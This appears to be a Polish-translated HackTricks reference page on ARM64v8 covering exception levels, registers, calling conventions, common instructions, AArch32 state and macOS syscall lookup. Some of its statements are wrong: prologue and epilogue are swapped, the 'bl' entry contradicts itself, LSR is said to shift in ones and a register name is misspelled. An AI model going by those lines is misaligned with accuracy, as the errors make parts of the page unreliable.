# Wprowadzenie do ARM64v8

{{#include ../../../banners/hacktricks-training.md}}

## **Poziomy wyjątków - EL (ARM64v8)**

W architekturze ARMv8 poziomy wykonania, znane jako Exception Levels (EL), określają poziom przywilejów i możliwości środowiska wykonawczego. Istnieją cztery poziomy wyjątków, od EL0 do EL3, z których każdy pełni inną rolę:

1. **EL0 - tryb użytkownika**:
- To najmniej uprzywilejowany poziom, używany do wykonywania zwykłego kodu aplikacji.
- Aplikacje działające w EL0 są izolowane od siebie i od oprogramowania systemowego, co zwiększa bezpieczeństwo i stabilność.
2. **EL1 - tryb jądra systemu operacyjnego**:
- Większość jąder systemów operacyjnych działa na tym poziomie.
- EL1 ma więcej uprawnień niż EL0 i może uzyskiwać dostęp do zasobów systemowych, ale z pewnymi ograniczeniami w celu zachowania integralności systemu.
3. **EL2 - tryb hypervisora**:
- Ten poziom jest używany do wirtualizacji. Hypervisor działający w EL2 może zarządzać wieloma systemami operacyjnymi (każdy w swoim EL1) działającymi na tym samym fizycznym sprzęcie.
- EL2 dostarcza funkcje izolacji i kontroli środowisk wirtualizowanych.
4. **EL3 - tryb Secure Monitor**:
- To najbardziej uprzywilejowany poziom, często używany do bezpiecznego uruchamiania i zaufanych środowisk wykonywania.
- EL3 może zarządzać i kontrolować dostęp między stanami bezpiecznymi i niebezpiecznymi (np. secure boot, trusted OS itp.).

Użycie tych poziomów pozwala na uporządkowane i bezpieczne zarządzanie różnymi aspektami systemu, od aplikacji użytkownika po najbardziej uprzywilejowane oprogramowanie systemowe. Podejście ARMv8 do poziomów przywilejów pomaga skutecznie izolować różne komponenty systemu, zwiększając w ten sposób jego bezpieczeństwo i odporność.

## **Rejestry (ARM64v8)**

ARM64 ma **31 rejestrów ogólnego przeznaczenia**, oznaczonych `x0` do `x30`. Każdy może przechowywać wartość **64-bitową** (8 bajtów). Dla operacji wymagających tylko wartości 32-bitowych te same rejestry można adresować w trybie 32-bitowym używając nazw `w0` do `w30`.

1. **`x0`** do **`x7`** - Zwykle używane jako rejestry tymczasowe i do przekazywania parametrów do podprocedur.
- **`x0`** również zawiera dane zwracane przez funkcję
2. **`x8`** - W jądrze Linux `x8` jest używany jako numer wywołania systemowego dla instrukcji `svc`. **W macOS używany jest jednak x16!**
3. **`x9`** do **`x15`** - Kolejne rejestry tymczasowe, często używane dla zmiennych lokalnych.
4. **`x16`** i **`x17`** - **Intra-procedural Call Registers**. Rejestry tymczasowe dla wartości natychmiastowych. Są też używane do pośrednich wywołań funkcji i stubów PLT.
- **`x16`** jest używany jako **numer wywołania systemowego** dla instrukcji **`svc`** w **macOS**.
5. **`x18`** - **Platform register**. Może być używany jako rejestr ogólnego przeznaczenia, ale na niektórych platformach ten rejestr jest zarezerwowany do zastosowań specyficznych dla platformy: wskaźnik do bieżącego bloku środowiska wątku w Windows, lub wskaźnik do aktualnie **wykonywanej struktury zadania w jądrze linux**.
6. **`x19`** do **`x28`** - To rejestry zachowywane przez wywoływanego (callee-saved). Funkcja musi zachować wartości tych rejestrów dla swojego wywołującego, więc są one zapisywane na stosie i odzyskiwane przed powrotem do wywołującego.
7. **`x29`** - **Frame pointer** do śledzenia ramki stosu. Gdy tworzona jest nowa ramka stosu w wyniku wywołania funkcji, rejestr **`x29`** jest **zapisywany na stosie** a **nowy** adres wskaźnika ramki (adres **`sp`**) jest **zapisywany w tym rejestrze**.
- Ten rejestr może być też używany jako **rejestr ogólnego przeznaczenia**, chociaż zwykle służy jako odniesienie do **zmiennych lokalnych**.
8. **`x30`** lub **`lr`** - **Link register**. Zawiera **adres powrotu** gdy wykonywana jest instrukcja `BL` (Branch with Link) lub `BLR` (Branch with Link to Register) przez zapisanie wartości **`pc`** w tym rejestrze.
- Może być też używany jak każdy inny rejestr.
- Jeśli bieżąca funkcja wywoła nową funkcję i nadpisze `lr`, zapisze go na stosie na początku (to jest epilog (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Zapisz `fp` i `lr`, wygeneruj miejsce i ustaw nowy `fp`)) i odzyska go na końcu (to jest prolog (`ldp x29, x30, [sp], #48; ret` -> Odzyskaj `fp` i `lr` i wróć)).
9. **`sp`** - **Stack pointer**, używany do śledzenia szczytu stosu.
- wartość **`sp`** powinna zawsze zachować co najmniej **wyrównanie do quadword** inaczej może wystąpić wyjątek wyrównania.
10. **`pc`** - **Program counter**, wskazuje na następną instrukcję. Ten rejestr może być aktualizowany tylko poprzez generowanie wyjątków, powroty z wyjątków i branche. Jedynymi zwykłymi instrukcjami, które mogą odczytać ten rejestr, są instrukcje branch with link (BL, BLR) aby zapisać adres **`pc`** w **`lr`** (Link Register).
11. **`xzr`** - **Zero register**. Nazywany też **`wzr`** w swojej 32-bitowej formie. Można go użyć do łatwego uzyskania zera (częsta operacja) lub do wykonywania porównań używając **`subs`** jak **`subs XZR, Xn, #10`** nie zapisując wyniku nigdzie (w **`xzr`**).

Rejestry **`Wn`** są wersją **32-bitową** rejestru **`Xn`**.

> [!TIP]
> Rejestry od X0 do X18 są lotne (volatile), co oznacza, że ich wartości mogą być zmieniane przez wywołania funkcji i przerwania. Natomiast rejestry od X19 do X28 są nie-lotne (non-volatile), co oznacza, że ich wartości muszą być zachowane podczas wywołań funkcji ("callee saved").

### Rejestry SIMD i zmiennoprzecinkowe

Ponadto istnieje jeszcze **32 rejestry o długości 128 bitów**, które mogą być używane w zoptymalizowanych operacjach single instruction multiple data (SIMD) oraz do obliczeń zmiennoprzecinkowych. Są one nazywane rejestrami Vn chociaż mogą też działać w trybach **64**-bit, **32**-bit, **16**-bit i **8**-bit i wtedy nazywane są **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** i **`Bn`**.

### Rejestry systemowe

**Istnieją setki rejestrów systemowych**, nazywanych także rejestrami specjalnego przeznaczenia (SPRs), używanych do **monitorowania** i **kontroli** zachowania **procesora**.\
Można je odczytywać lub ustawiać tylko przy użyciu dedykowanych instrukcji specjalnych **`mrs`** i **`msr`**.

Specjalne rejestry **`TPIDR_EL0`** i **`TPIDDR_EL0`** są często spotykane podczas inżynierii wstecznej. Sufiks `EL0` wskazuje minimalny poziom wyjątku, z którego rejestr może być dostępny (w tym przypadku EL0 to zwykły poziom przywilejów, na którym działają programy użytkownika).\
Często są używane do przechowywania **adresu bazowego lokalnej przestrzeni wątku** (thread-local storage). Zazwyczaj pierwszy jest czytelny i zapisywalny dla programów działających w EL0, ale drugi można odczytać z EL0 i zapisać z EL1 (np. jądro).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** zawiera kilka komponentów procesu zserializowanych w widocznym dla systemu operacyjnego specjalnym rejestrze **`SPSR_ELx`**, gdzie X to **poziom uprawnień wywołanego** wyjątku (to pozwala odzyskać stan procesu po zakończeniu wyjątku).\
Dostępne pola to:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Flagi warunkowe **`N`**, **`Z`**, **`C`** i **`V`**:
- **`N`** oznacza, że operacja dała wynik ujemny
- **`Z`** oznacza, że operacja dała zero
- **`C`** oznacza, że wystąpiło przeniesienie (carry)
- **`V`** oznacza, że operacja spowodowała przepełnienie ze znakiem:
- Suma dwóch dodatnich liczb daje wynik ujemny.
- Suma dwóch ujemnych liczb daje wynik dodatni.
- W odejmowaniu, gdy duża liczba ujemna jest odjęta od mniejszej dodatniej (lub odwrotnie), a wynik nie mieści się w zakresie danej szerokości bitowej.
- Oczywiście procesor nie wie, czy operacja jest ze znakiem czy bez, więc sprawdza C i V w operacjach i wskaże, czy wystąpiło przeniesienie niezależnie od tego, czy operacja była ze znakiem czy bez.

> [!WARNING]
> Nie wszystkie instrukcje aktualizują te flagi. Niektóre, takie jak **`CMP`** lub **`TST`**, to robią, a inne z sufiksem s, jak **`ADDS`**, także to robią.

- Aktualna **szerokość rejestru (`nRW`)**: Jeśli flaga ma wartość 0, program będzie działał w stanie wykonania AArch64 po wznowieniu.
- Aktualny **Poziom Wyjątku** (**`EL`**): Zwykły program działający w EL0 będzie miał wartość 0
- Flaga **single stepping** (**`SS`**): Używana przez debugery do pojedynczego kroku przez ustawienie flagi SS na 1 w **`SPSR_ELx`** przez wyjątek. Program wykona krok i zgłosi wyjątek pojedynczego kroku.
- Flaga stanu nielegalnego wyjątku (**`IL`**): Służy do oznaczania, gdy uprzywilejowane oprogramowanie wykonuje nieprawidłowy transfer poziomu wyjątku, ta flaga jest ustawiana na 1 i procesor wywołuje wyjątek nielegalnego stanu.
- Flagi **`DAIF`**: Te flagi pozwalają uprzywilejowanemu programowi selektywnie maskować pewne zewnętrzne wyjątki.
- Jeśli **`A`** jest 1 oznacza to, że będą wyzwalane **asynchroniczne aborty**. **`I`** konfiguruje reagowanie na zewnętrzne żądania przerwań sprzętowych (IRQs), a **`F`** dotyczy **Fast Interrupt Requests** (FIRs).
- Flagi wyboru wskaźnika stosu (**`SPS`**): Uprzywilejowane programy działające w EL1 i wyżej mogą przełączać się między używaniem własnego rejestru wskaźnika stosu a tym z modelu użytkownika (np. między `SP_EL1` a `EL0`). To przełączenie realizowane jest przez zapis do specjalnego rejestru **`SPSel`**. Nie można tego zrobić z EL0.

## **Konwencja wywołań (ARM64v8)**

Konwencja wywołań ARM64 określa, że **pierwsze osiem parametrów** funkcji przekazywane jest w rejestrach **`x0` do `x7`**. **Dodatkowe** parametry przekazywane są na **stosu**. Wartość **zwracana** jest przekazywana w rejestrze **`x0`**, lub także w **`x1`**, jeśli ma **128 bitów**. Rejestry **`x19`** do **`x30`** oraz **`sp`** muszą być **zachowane** podczas wywołań funkcji.

Czytając funkcję w asemblerze, szukaj **prologu i epilogu funkcji**. **Prolog** zwykle obejmuje **zapisanie wskaźnika ramki (`x29`)**, **ustawienie** nowego wskaźnika ramki oraz **alokację przestrzeni na stosie**. **Epilog** zwykle obejmuje **przywrócenie zapisanego wskaźnika ramki** i **powrót** z funkcji.

### Konwencja wywołań w Swift

Swift ma własną **konwencję wywołań**, którą można znaleźć pod adresem [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Często używane instrukcje (ARM64v8)**

Instrukcje ARM64 zwykle mają **format `opcode dst, src1, src2`**, gdzie **`opcode`** to operacja do wykonania (takie jak `add`, `sub`, `mov` itp.), **`dst`** to rejestr docelowy, w którym zostanie zapisany wynik, a **`src1`** i **`src2`** to rejestry źródłowe. W miejsce rejestrów źródłowych można także użyć wartości natychmiastowych.

- **`mov`**: **Przenieś** wartość z jednego **rejestru** do drugiego.
- Przykład: `mov x0, x1` — Przenosi wartość z `x1` do `x0`.
- **`ldr`**: **Załaduj** wartość z **pamięci** do **rejestru**.
- Przykład: `ldr x0, [x1]` — Ładuje wartość z adresu pamięci wskazywanego przez `x1` do `x0`.
- **Tryb offsetu**: Offset wpływający na wskaźnik źródłowy jest wskazany, na przykład:
- `ldr x2, [x1, #8]`, to załaduje do x2 wartość z x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, załaduje do x2 obiekt z tablicy x0, z pozycji x1 (indeks) * 4
- **Tryb pre-indeksowany**: Najpierw obliczany jest adres, wynik jest użyty do załadowania i jednocześnie nowy adres jest zapisany w rejestrze źródłowym.
- `ldr x2, [x1, #8]!`, to załaduje `x1 + 8` do `x2` i zapisze w x1 wynik `x1 + 8`
- `str lr, [sp, #-4]!`, Zapisz link register do sp i zaktualizuj rejestr sp
- **Tryb post-indeksowany**: Podobny do poprzedniego, ale adres pamięci jest odczytywany najpierw, a potem obliczany i zapisywany offset.
- `ldr x0, [x1], #8`, załaduj z `x1` do `x0` i zaktualizuj x1 do `x1 + 8`
- **Adresowanie w relacji do PC**: W tym przypadku adres do załadowania jest obliczany względem rejestru PC
- `ldr x1, =_start`, To załaduje adres, gdzie zaczyna się symbol `_start` do x1 względem bieżącego PC.
- **`str`**: **Zapisz** wartość z **rejestru** do **pamięci**.
- Przykład: `str x0, [x1]` — Zapisuje wartość z `x0` do pamięci pod adresem wskazywanym przez `x1`.
- **`ldp`**: **Load Pair of Registers**. Ta instrukcja **ładuje dwa rejestry** z **kolejnych lokacji pamięci**. Adres pamięci jest zwykle utworzony przez dodanie offsetu do wartości w innym rejestrze.
- Przykład: `ldp x0, x1, [x2]` — Ładuje `x0` i `x1` z lokacji pamięci pod `x2` i `x2 + 8`.
- **`stp`**: **Store Pair of Registers**. Ta instrukcja **zapisuje dwa rejestry** do **kolejnych lokacji pamięci**. Adres pamięci jest zwykle utworzony przez dodanie offsetu do wartości w innym rejestrze.
- Przykład: `stp x0, x1, [sp]` — Zapisuje `x0` i `x1` do lokacji pamięci pod `sp` i `sp + 8`.
- `stp x0, x1, [sp, #16]!` — Zapisuje `x0` i `x1` do lokacji pamięci pod `sp+16` i `sp + 24`, oraz aktualizuje `sp` do `sp+16`.
- **`add`**: **Dodaj** wartości dwóch rejestrów i zapisz wynik w rejestrze.
- Składnia: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Docelowy
- Xn2 -> Operand 1
- Xn3 | #imm -> Operand 2 (rejestr lub natychmiastowa)
- \[shift #N | RRX] -> Wykonaj przesunięcie lub użyj RRX
- Przykład: `add x0, x1, x2` — Dodaje wartości w `x1` i `x2` i zapisuje wynik w `x0`.
- `add x5, x5, #1, lsl #12` — To równa się 4096 (1 przesunięte 12 razy) -> 1 0000 0000 0000 0000
- **`adds`** To wykonuje `add` i aktualizuje flagi
- **`sub`**: **Odejmij** wartości dwóch rejestrów i zapisz wynik w rejestrze.
- Sprawdź **składnię `add`**.
- Przykład: `sub x0, x1, x2` — Odejmuje wartość w `x2` od `x1` i zapisuje wynik w `x0`.
- **`subs`** To jak `sub` ale aktualizuje flagi
- **`mul`**: **Mnożenie** wartości dwóch rejestrów i zapisanie wyniku w rejestrze.
- Przykład: `mul x0, x1, x2` — Mnoży wartości w `x1` i `x2` i zapisuje wynik w `x0`.
- **`div`**: **Dzielenie** wartości jednego rejestru przez inny i zapisanie wyniku w rejestrze.
- Przykład: `div x0, x1, x2` — Dzieli wartość w `x1` przez `x2` i zapisuje wynik w `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Dodaje 0 z końca przesuwając inne bity do przodu (mnożenie przez 2^n)
- **Logical shift right**: Dodaje 1 na początku przesuwając bity do tyłu (dzielenie przez 2^n dla wartości bez znaku)
- **Arithmetic shift right**: Jak **`lsr`**, ale zamiast dodawać 0, jeśli najbardziej znaczący bit jest 1, dodaje 1 (dzielenie przez 2^n dla wartości ze znakiem)
- **Rotate right**: Jak **`lsr`** ale to, co jest usunięte z prawej, jest doklejane z lewej
- **Rotate Right with Extend**: Jak **`ror`**, ale używa flagi carry jako "najbardziej znaczącego bitu". Zatem flaga carry jest przenoszona na bit 31, a usunięty bit trafia do flagi carry.
- **`bfm`**: **Bit Field Move**, te operacje **kopiują bity `0...n`** z wartości i umieszczają je w pozycjach **`m..m+n`**. **`#s`** określa **pozycję lewej granicy bitu**, a **`#r`** ilość rotacji w prawo.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Kopiuje pole bitowe z rejestru i wstawia je do innego rejestru.
- **`BFI X1, X2, #3, #4`** Wstawia 4 bity z X2 od 3. bitu do X1
- **`BFXIL X1, X2, #3, #4`** Wyciąga od 3. bitu z X2 cztery bity i kopiuje je do X1
- **`SBFIZ X1, X2, #3, #4`** Rozszerza znak 4 bitów z X2 i wstawia je do X1 zaczynając od pozycji bitowej 3, zerując bity po prawej
- **`SBFX X1, X2, #3, #4`** Wyciąga 4 bity zaczynając od bitu 3 z X2, rozszerza znak i umieszcza wynik w X1
- **`UBFIZ X1, X2, #3, #4`** Zerowo rozszerza 4 bity z X2 i wstawia je do X1 zaczynając od pozycji bitowej 3, zerując bity po prawej
- **`UBFX X1, X2, #3, #4`** Wyciąga 4 bity zaczynając od bitu 3 z X2 i umieszcza zerowo rozszerzony wynik w X1.
- **Sign Extend To X:** Rozszerza znak (lub dodaje same 0 w wersji bez znaku) wartości, aby można było wykonywać operacje:
- **`SXTB X1, W2`** Rozszerza znak bajtu **z W2 do X1** (`W2` to połowa `X2`) aby wypełnić 64 bity
- **`SXTH X1, W2`** Rozszerza znak 16-bitowej liczby **z W2 do X1** aby wypełnić 64 bity
- **`SXTW X1, W2`** Rozszerza znak **z W2 do X1** aby wypełnić 64 bity
- **`UXTB X1, W2`** Dodaje 0 (bez znaku) do bajtu **z W2 do X1** aby wypełnić 64 bity
- **`extr`:** Wyciąga bity z określonej **pary rejestrów połączonych razem**.
- Przykład: `EXTR W3, W2, W1, #3` To **połączy W1+W2** i pobierze **od bitu 3 W2 do bitu 3 W1** i zapisze w W3.
- **`cmp`**: **Porównaj** dwa rejestry i ustaw flagi warunkowe. Jest to **alias `subs`** ustawiający rejestr docelowy na rejestr zero. Przydatne, aby sprawdzić czy `m == n`.
- Obsługuje **tę samą składnię co `subs`**
- Przykład: `cmp x0, x1` — Porównuje wartości w `x0` i `x1` i ustawia odpowiednio flagi warunkowe.
- **`cmn`**: **Porównanie z negatywem** operandu. W tym przypadku jest to **alias `adds`** i obsługuje tę samą składnię. Przydatne, aby sprawdzić czy `m == -n`.
- **`ccmp`**: Warunkowe porównanie, to porównanie które zostanie wykonane tylko jeśli poprzednie porównanie było prawdziwe i specyficznie ustawi bity nzcv.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> jeśli x1 != x2 i x3 < x4, skocz do func
- To dlatego, że **`ccmp`** zostanie wykonane tylko jeśli **poprzedni `cmp` był `NE`**, jeśli nie był to bity `nzcv` zostaną ustawione na 0 (co nie spełni porównania `blt`).
- To może też być użyte jako `ccmn` (to samo ale negatywne, jak `cmp` vs `cmn`).
- **`tst`**: Sprawdza czy dowolne z wartości porównania mają oba bity ustawione na 1 (działa jak ANDS bez zapisywania wyniku). Przydatne do sprawdzenia rejestru pod kątem pewnych bitów.
- Przykład: `tst X1, #7` Sprawdza czy dowolny z ostatnich 3 bitów X1 jest 1
- **`teq`**: Operacja XOR odrzucająca wynik
- **`b`**: Bezwarunkowy Branch
- Przykład: `b myFunction`
- Zauważ, że to nie zapisze adresu powrotu w link register (nie nadaje się do wywołań podprogramów, które muszą wrócić)
- **`bl`**: **Branch** z linkiem, używane do **wywołania** **podprogramu**. Zapisuje **adres powrotu w `x30`**.
- Przykład: `bl myFunction` — Wywołuje funkcję `myFunction` i zapisuje adres powrotu w `x30`.
- Uwaga: to nie wypełni link register adresem powrotu (nieodpowiednie dla podprogramów wymagających powrotu) [uwaga: oryginalny tekst zawierał sprzeczne powtórzenie — zachowano sens].
- **`blr`**: **Branch** z linkiem do rejestru, używane do **wywołania** podprogramu, gdzie cel jest **określony** w **rejestrze**. Zapisuje adres powrotu w `x30`.
- Przykład: `blr x1` — Wywołuje funkcję, której adres jest w `x1` i zapisuje adres powrotu w `x30`.
- **`ret`**: **Powrót** z podprogramu, zazwyczaj używając adresu w **`x30`**.
- Przykład: `ret` — Powrót z bieżącego podprogramu używając adresu powrotu w `x30`.
- **`b.<cond>`**: Warunkowe skoki
- **`b.eq`**: **Skocz jeśli równe**, na podstawie poprzedniej instrukcji `cmp`.
- Przykład: `b.eq label` — Jeśli poprzednie `cmp` stwierdziło równość, skocz do `label`.
- **`b.ne`**: **Skocz jeśli nierówne**. Instrukcja sprawdza flagi warunkowe (ustawione przez poprzednie porównanie) i jeśli wartości nie były równe, wykonuje skok.
- Przykład: Po `cmp x0, x1` instrukcja `b.ne label` — Jeśli wartości w `x0` i `x1` były różne, skocz do `label`.
- **`cbz`**: **Compare and Branch on Zero**. Instrukcja porównuje rejestr z zerem, i jeśli są równe, wykonuje skok.
- Przykład: `cbz x0, label` — Jeśli wartość w `x0` jest zerowa, skocz do `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Instrukcja porównuje rejestr z zerem, i jeśli są różne, wykonuje skok.
- Przykład: `cbnz x0, label` — Jeśli wartość w `x0` jest różna od zera, skocz do `label`.
- **`tbnz`**: Test bitu i skok jeśli niezerowy
- Przykład: `tbnz x0, #8, label`
- **`tbz`**: Test bitu i skok jeśli zerowy
- Przykład: `tbz x0, #8, label`
- **Operacje wyboru warunkowego**: To operacje, których zachowanie zależy od bitów warunkowych.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Jeśli prawda, X0 = X1, jeśli fałsz, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Jeśli prawda, Xd = Xn, jeśli fałsz, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Jeśli prawda, Xd = Xn + 1, jeśli fałsz, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Jeśli prawda, Xd = Xn, jeśli fałsz, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Jeśli prawda, Xd = NOT(Xn), jeśli fałsz, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Jeśli prawda, Xd = Xn, jeśli fałsz, Xd = - Xm
- `cneg Xd, Xn, cond` -> Jeśli prawda, Xd = - Xn, jeśli fałsz, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Jeśli prawda, Xd = 1, jeśli fałsz, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Jeśli prawda, Xd = \<all 1>, jeśli fałsz, Xd = 0
- **`adrp`**: Oblicza **adres strony symbolu** i zapisuje go w rejestrze.
- Przykład: `adrp x0, symbol` — Oblicza adres strony symbolu `symbol` i zapisuje go w `x0`.
- **`ldrsw`**: **Załaduj** 32-bitową liczbę ze znakiem z pamięci i **rozszerz ją znakiem do 64** bitów.
- Przykład: `ldrsw x0, [x1]` — Ładuje 32-bitową liczbę ze znakiem z adresu w `x1`, rozszerza do 64-bitów i zapisuje w `x0`.
- **`stur`**: **Zapisz wartość rejestru do pamięci**, używając offsetu od innego rejestru.
- Przykład: `stur x0, [x1, #4]` — Zapisuje wartość z `x0` do adresu pamięci będącego o 4 bajty większym niż adres w `x1`.
- **`svc`** : Wykonaj **wywołanie systemowe**. Oznacza "Supervisor Call". Gdy procesor wykona tę instrukcję, **przełącza się z trybu użytkownika do trybu jądra** i skacze do określonego miejsca w pamięci, gdzie znajduje się kod obsługi wywołań systemowych jądra.

- Przykład:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Prolog funkcji**

1. **Zapisz link register i frame pointer na stosie**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Ustaw nowy wskaźnik ramki**: `mov x29, sp` (ustawia nowy wskaźnik ramki dla bieżącej funkcji)
3. **Zarezerwuj miejsce na stosie dla zmiennych lokalnych** (jeśli potrzebne): `sub sp, sp, <size>` (gdzie `<size>` to liczba potrzebnych bajtów)

### **Epilog funkcji**

1. **Zwolnij miejsce dla zmiennych lokalnych (jeśli zostały zarezerwowane)**: `add sp, sp, <size>`
2. **Przywróć rejestr linku i wskaźnik ramki**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Powrót**: `ret` (zwraca kontrolę wywołującemu, używając adresu w rejestrze powrotu)

## AARCH32 Stan wykonywania

Armv8-A wspiera wykonywanie programów 32-bitowych. **AArch32** może działać w jednym z **dwóch zestawów instrukcji**: **`A32`** i **`T32`** i może przełączać się między nimi poprzez **`interworking`**.\
**Privileged** 64-bitowe programy mogą zaplanować **wykonywanie programów 32-bitowych** przez wykonanie transferu poziomu wyjątków do niżej uprzywilejowanego środowiska 32-bitowego.\
Zauważ, że przejście z 64-bit do 32-bit następuje przy niższym poziomie wyjątków (na przykład program 64-bitowy w EL1 wywołujący program w EL0). Odbywa się to przez ustawienie **bitu 4 w** specjalnym rejestrze **`SPSR_ELx``** **na 1** kiedy wątek procesu `AArch32` jest gotowy do wykonania, a reszta `SPSR_ELx` przechowuje CPSR programu **`AArch32`**. Następnie uprzywilejowany proces wywołuje instrukcję **`ERET`**, dzięki czemu procesor przechodzi do **`AArch32`** wchodząc w A32 lub T32 w zależności od CPSR**.**

The **`interworking`** occurs using the J and T bits of CPSR. `J=0` and `T=0` means **`A32`** and `J=0` and `T=1` means **T32**. This basically traduces on setting the **lowest bit to 1** to indicate the instruction set is T32.\
This is set during the **interworking branch instructions,** but can also be set directly with other instructions when the PC is set as the destination register. Example:

Another example:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Rejestry

Istnieje 16 32-bitowych rejestrów (r0-r15). **Od r0 do r14** mogą być używane do **dowolnych operacji**, jednak niektóre z nich są zwykle zarezerwowane:

- **`r15`**: Program counter (zawsze). Zawiera adres następnej instrukcji. W A32 current + 8, w T32 current + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer (Uwaga: stos jest zawsze wyrównany do 16 bajtów)
- **`r14`**: Link Register

Co więcej, rejestry są zapisywane w **`banked registries`**. Są to miejsca przechowujące wartości rejestrów umożliwiające **szybkie przełączanie kontekstu** podczas obsługi wyjątków i operacji uprzywilejowanych, aby uniknąć potrzeby ręcznego zapisywania i przywracania rejestrów za każdym razem.\
Odbywa się to przez **zapisanie stanu procesora z `CPSR` do `SPSR`** trybu procesora, do którego nastąpił wyjątek. Przy powrocie z wyjątku **`CPSR`** jest przywracany z **`SPSR`**.

### CPSR - Current Program Status Register

W AArch32 CPSR działa podobnie do **`PSTATE`** w AArch64 i jest również zapisywany w **`SPSR_ELx`** gdy wystąpi wyjątek, aby później przywrócić wykonanie:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Pola są podzielone na kilka grup:

- Application Program Status Register (APSR): Flagi arytmetyczne i dostępne z poziomu EL0
- Execution State Registers: Zachowanie procesu (zarządzane przez OS).

#### Application Program Status Register (APSR)

- Flagi **`N`**, **`Z`**, **`C`**, **`V`** (tak jak w AArch64)
- Flaga **`Q`**: Ustawiana na 1 zawsze, gdy podczas wykonania wystąpi **saturacja całkowitoliczbowa** w trakcie wykonywania specjalizowanej instrukcji arytmetycznej ze saturacją. Gdy zostanie ustawiona na **`1`**, zachowa tę wartość aż do ręcznego ustawienia na 0. Ponadto nie ma żadnej instrukcji, która sprawdza jej wartość w sposób implicytny — trzeba ją odczytać ręcznie.
- Flagi **`GE`** (Greater than or equal): Są używane w operacjach SIMD (Single Instruction, Multiple Data), takich jak „parallel add” i „parallel subtract”. Te operacje pozwalają przetwarzać wiele punktów danych w ramach jednej instrukcji.

Na przykład instrukcja **`UADD8`** **dodaje cztery pary bajtów** (z dwóch operandów 32-bitowych) równolegle i zapisuje wyniki w rejestrze 32-bitowym. Następnie **ustawia flagi `GE` w `APSR`** w oparciu o te wyniki. Każda flaga GE odpowiada jednej z dodawanych par bajtów, wskazując, czy dodawanie dla tej pary bajtów **przepełniło**.

Instrukcja **`SEL`** używa tych flag GE do wykonywania warunkowych operacji.

#### Execution State Registers

- Bity **`J`** i **`T`**: **`J`** powinien być 0, a jeśli **`T`** jest 0 używany jest zestaw instrukcji A32, a jeśli jest 1, używany jest T32.
- Rejestr stanu bloku IT (`ITSTATE`): To bity z zakresu 10-15 i 25-26. Przechowują warunki dla instrukcji wewnątrz grupy poprzedzonej prefiksem **`IT`**.
- Bit **`E`**: Wskazuje **endianness**.
- Bity trybu i maski wyjątków (0-4): Określają aktualny stan wykonania. Piąty z nich wskazuje, czy program działa jako 32-bitowy (1) czy 64-bitowy (0). Pozostałe 4 reprezentują aktualnie używany tryb wyjątków (gdy wystąpi wyjątek i jest obsługiwany). Ustawiona liczba **wskazuje bieżący priorytet** w przypadku, gdy podczas obsługi tego wyjątku wystąpi inny wyjątek.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Niektóre wyjątki można wyłączyć za pomocą bitów **`A`**, `I`, `F`. Jeśli **`A`** jest 1, oznacza to, że będą wywoływane **asynchronous aborts**. **`I`** konfiguruje reagowanie na zewnętrzne żądania przerwań sprzętowych (Interrupt Requests, IRQs). `F` odnosi się do **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Sprawdź [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) lub uruchom `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls będą miały **x16 > 0**.

### Mach Traps

Zobacz w [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) tabelę `mach_trap_table` oraz w [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) prototypy. Maksymalna liczba Mach traps to `MACH_TRAP_TABLE_COUNT` = 128. Mach traps będą miały **x16 < 0**, więc trzeba wywoływać numery z poprzedniej listy ze znakiem minus: **`_kernelrpc_mach_vm_allocate_trap`** to **`-10`**.

Możesz też sprawdzić **`libsystem_kernel.dylib`** w disassemblerze, aby znaleźć, jak wywoływać te (i BSD) syscalls:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
